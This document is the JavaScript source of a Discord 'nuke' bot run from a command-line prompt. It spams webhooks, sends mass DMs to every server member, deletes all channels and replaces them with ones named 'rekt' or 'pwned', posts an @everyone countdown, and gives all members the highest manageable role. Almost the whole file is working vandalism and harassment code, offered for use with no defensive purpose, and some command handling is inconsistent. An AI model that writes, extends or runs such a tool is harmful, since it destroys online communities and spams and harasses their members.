/* 
 * Basic Nuke Tool
 * Author: Vescira
 * Last Updated: 2025-04-12
 */

// Dependencies
const discord = require('discord.js');
const { Client, GatewayIntentBits } = discord;
const readline = require('readline');
const colors = require('chalk');
const moment = require('moment');
const axios = require('axios');

// --- Config ---
const BANNER = `
    ____  ___   _____ __________
   / __ )/   | / ___//  _/ ____/
  / __  / /| | \\__ \\ / // /     
 / /_/ / ___ |___/ // // /___   
/_____/_/  |_/____/___/\\____/   
`;

// Track active operations
const activeOps = {
  webhook: null,
  massDM: false,
  warnNuke: false
};

// Custom styling functions
function Gradient(text, colorA = '#00FF88', colorB = '#00AAFF') {
  const steps = text.length;
  let result = '';
  
  function hexToRgb(hex) {
    const r = parseInt(hex.slice(1, 3), 16);
    const g = parseInt(hex.slice(3, 5), 16);
    const b = parseInt(hex.slice(5, 7), 16);
    return { r, g, b };
  }

  const start = hexToRgb(colorA);
  const end = hexToRgb(colorB);

  for (let i = 0; i < steps; i++) {
    const ratio = i / (steps - 1);
    const r = Math.round(start.r + (end.r - start.r) * ratio);
    const g = Math.round(start.g + (end.g - start.g) * ratio);
    const b = Math.round(start.b + (end.b - start.b) * ratio);
    
    result += colors.rgb(r, g, b)(text[i]);
  }

  return result;
}

// Styling presets
const style = {
  normal: (t) => Gradient(t),
  error: (t) => Gradient('✗ ' + t, '#FF5555', '#FF0000'),
  ok: (t) => Gradient('✓ ' + t, '#00FF00', '#00AA00'),
  warning: (t) => Gradient('⚠ ' + t, '#FFFF00', '#FFAA00'),
  alert: (t) => Gradient(t, '#FF0000', '#FF5500')
};

// --- Setup ---
const bot = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const cli = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// --- Helper Functions ---

function showPrompt() {
  cli.setPrompt(style.normal('[BASIC] >> '));
  cli.prompt();
}

function stopAll() {
  // Clean up any running operations
  if (activeOps.webhook) {
    clearInterval(activeOps.webhook);
    activeOps.webhook = null;
    console.log(style.warning('Webhook spam stopped'));
  }
  
  activeOps.massDM = false;
  activeOps.warnNuke = false;
  
  console.log(style.warning('All operations stopped'));
}

// Webhook spam with rate limiting
async function spamWebhook(url, msg, delay = 1000) {
  try {
    let count = 0;
    console.log(style.warning(`Starting webhook spam (${delay}ms delay)`));
    
    const timer = setInterval(async () => {
      if (!activeOps.webhook) {
        clearInterval(timer);
        return;
      }
      
      try {
        await axios.post(url, { content: msg });
        count++;
        process.stdout.write(style.normal(`\rSent: ${count}`));
      } catch (e) {
        clearInterval(timer);
        activeOps.webhook = null;
        const errMsg = e.response?.data?.message || e.message;
        console.log(style.error(`\nFailed after ${count} messages: ${errMsg}`));
      }
    }, delay);

    activeOps.webhook = timer;
    
  } catch (e) {
    console.log(style.error('Webhook error: ' + e.message));
  }
}

// Mass DM with rate limit protection
async function sendMassDM(guildId, message) {
  const server = bot.guilds.cache.get(guildId);
  if (!server) {
    console.log(style.error('Server not found!'));
    return;
  }

  activeOps.massDM = true;
  
  try {
    const members = await server.members.fetch();
    console.log(style.warning(`DMing ${members.size} members...`));

    let sent = 0;
    const failed = [];

    for (const [_, member] of members) {
      if (!activeOps.massDM) break;
      
      try {
        await member.send(message);
        sent++;
        process.stdout.write(style.normal(`\rSent: ${sent}/${members.size}`));
        await new Promise(r => setTimeout(r, 1000)); // Rate limit
      } catch (e) {
        failed.push(member.user.tag);
      }
    }

    activeOps.massDM = false;
    console.log(style.ok(`\nSent ${sent} DMs!`));
    
    if (failed.length) {
      console.log(style.warning(`${failed.length} failed:`));
      console.log(failed.join(', '));
    }
    
  } catch (e) {
    activeOps.massDM = false;
    console.log(style.error('Error: ' + e.message));
  }
}

// --- Nuke Functions ---

async function basicNuke(guild) {
  activeOps.warnNuke = true;
  try {
    await performNuke(guild);
    console.log(style.ok('Nuke complete!'));
  } catch (e) {
    console.log(style.error('Nuke failed: ' + e.message));
  }
  activeOps.warnNuke = false;
}

async function warnNuke(guildId) {
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) {
    console.log(style.error('Server not found!'));
    return;
  }

  activeOps.warnNuke = true;
  
  try {
    const channel = guild.channels.cache
      .filter(c => c.isTextBased())
      .first();

    if (!channel) {
      console.log(style.error('No text channels!'));
      return;
    }

    const warnMsg = await channel.send(style.alert(`
🚨 **SERVER WILL BE NUKE IN 10 SECONDS** 🚨
@everyone 
This is your only warning!
    `));
    
    console.log(style.warning(`Warning sent to #${channel.name}`));

    // Countdown
    for (let i = 9; i >= 0; i--) {
      if (!activeOps.warnNuke) break;
      
      await warnMsg.edit(style.alert(`
💣 **NUKE IN ${i} SECONDS** 💣
@everyone 
Time remaining: ${i}s
      `));
      
      console.log(style.warning(`${i}...`));
      await new Promise(r => setTimeout(r, 1000));
    }

    if (activeOps.warnNuke) {
      await performNuke(guild);
      console.log(style.alert('BOOM! Server nuked'));
    } else {
      await warnMsg.edit('🚨 **NUKE CANCELED** 🚨');
      console.log(style.warning('Nuke aborted'));
    }
    
  } catch (e) {
    console.log(style.error('Warn nuke failed: ' + e.message));
  }
  
  activeOps.warnNuke = false;
}

// NEW FUNCTION: Give everyone highest role
async function destroyNuke(guildId) {
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) {
    console.log(style.error('Server not found!'));
    return;
  }

  try {
    console.log(style.warning('Starting destroy nuke (giving everyone highest role)'));

    // Get the highest role the bot can manage
    const highestRole = guild.roles.cache
      .filter(role => role.editable && !role.managed)
      .sort((a, b) => b.position - a.position)
      .first();

    if (!highestRole) {
      console.log(style.error('No manageable roles found!'));
      return;
    }

    console.log(style.warning(`Using role: ${highestRole.name}`));

    const members = await guild.members.fetch();
    console.log(style.warning(`Processing ${members.size} members...`));

    let success = 0;
    const failed = [];

    for (const [_, member] of members) {
      try {
        // Skip if already has the role
        if (member.roles.cache.has(highestRole.id)) continue;
        
        await member.roles.add(highestRole);
        success++;
        process.stdout.write(style.normal(`\rProcessed: ${success}/${members.size}`));
        await new Promise(r => setTimeout(r, 500)); // Rate limit
      } catch (e) {
        failed.push(member.user.tag);
      }
    }

    console.log(style.ok(`\nAdded role to ${success} members!`));
    
    if (failed.length) {
      console.log(style.warning(`${failed.length} failed:`));
      console.log(failed.join(', '));
    }
    
  } catch (e) {
    console.log(style.error('Destroy nuke failed: ' + e.message));
  }
}

async function performNuke(guild) {
  try {
    // Delete channels
    await Promise.all(
      guild.channels.cache.map(c => c.delete().catch(() => {}))
    );
    console.log(style.ok('Channels deleted'));

    // Create new chaotic channels
    const names = ['destroyed', 'rekt', 'owned', 'nuked', 'basic', 'basic-nuker', 'rekt', 'pwned-n-owned', 'taken-over-by-basic'];
    for (let i = 0; i < 5; i++) {
      if (!activeOps.warnNuke) break;
      
      await guild.channels.create({
        name: `${names[Math.floor(Math.random() * names.length)]}-${Math.random().toString(36).slice(2, 6)}`,
        type: 'GUILD_TEXT'
      }).catch(() => {});
    }
    
    console.log(style.warning('New channels created'));
    
  } catch (e) {
    console.log(style.error('Nuke error: ' + e.message));
  }
}

// --- Command Handling ---

function listServers() {
  console.log(style.normal('\n=== SERVERS ==='));
  bot.guilds.cache.forEach(g => {
    console.log(style.normal(`
${g.name} (${g.id})
Members: ${g.memberCount}
Joined: ${moment(g.joinedAt).format('YYYY-MM-DD')}
`));
  });
  console.log(style.normal('===============\n'));
}

function handleCLI(input) {
  const parts = input.trim().split(/ +/);
  const cmd = parts.shift().toLowerCase();

  if (!cmd) {
    stopAll();
    showPrompt();
    return;
  }

  switch (cmd) {
    case '-wh':
      if (parts.length < 3 || parts[0] !== '-m') {
        console.log(style.error('Use: -wh <url> -m <msg> [-t delay]'));
        break;
      }
      
      const url = parts[0];
      const msg = parts.slice(parts.indexOf('-m') + 1).join(' ');
      const delay = parts.includes('-t') ? parseInt(parts[parts.indexOf('-t') + 1]) || 1000 : 1000;
      
      spamWebhook(url, msg, delay);
      break;

    case '-md':
      if (parts.length < 3 || parts[0] !== '-s') {
        console.log(style.error('Use: -md -s <serverId> <message>'));
        break;
      }
      sendMassDM(parts[1], parts.slice(2).join(' '));
      break;

    case '-w':
      if (parts.length < 2 || parts[0] !== '-s') {
        console.log(style.error('Use: -w -s <serverId>'));
        break;
      }
      warnNuke(parts[1]);
      break;

    case '-b':
      if (parts.length < 2 || parts[0] !== '-s') {
        console.log(style.error('Use: -b -s <serverId>'));
        break;
      }
      basicNuke(bot.guilds.cache.get(parts[1]));
      break;

    case '-dn': // NEW COMMAND: Destroy Nuke
      if (parts.length < 2 || parts[0] !== '-s') {
        console.log(style.error('Use: -dn -s <serverId>'));
        break;
      }
      destroyNuke(parts[1]);
      break;

    case '-ss':
      listServers();
      break;

    case '-cls':
      console.clear();
      console.log(style.normal(BANNER));
      console.log(style.ok(`Logged in as ${bot.user.tag}`));
      console.log(style.normal('Press enter to stop'));
      break;

    case 'exit':
      stopAll();
      console.log(style.normal('Bye!'));
      process.exit(0);
      break;

    default:
      console.log(style.normal(`
=== COMMANDS ===
-wh <url> -m <msg> [-t ms]  Webhook spam
-md -s <id> <msg>           Mass DM server
-wn -s <id>                 War nuke with countdown
-ss                         Show all servers
(Enter)                     Stop all attacks
exit                        Quit
================`));
  }
  
  showPrompt();
}

// --- Startup ---

cli.question(style.normal('Bot token: '), token => {
  console.clear();
  
  bot.login(token)
    .then(() => {
      console.log(style.normal(BANNER));
      console.log(style.ok(`Connected as ${bot.user.tag}`));
      console.log(style.normal('Use -h to see commands.'));
      
      showPrompt();
    })
    .catch(e => {
      console.log(style.error('Login failed: ' + e.message));
      process.exit(1);
    });
});

cli.on('line', input => {
  handleCLI(input);
});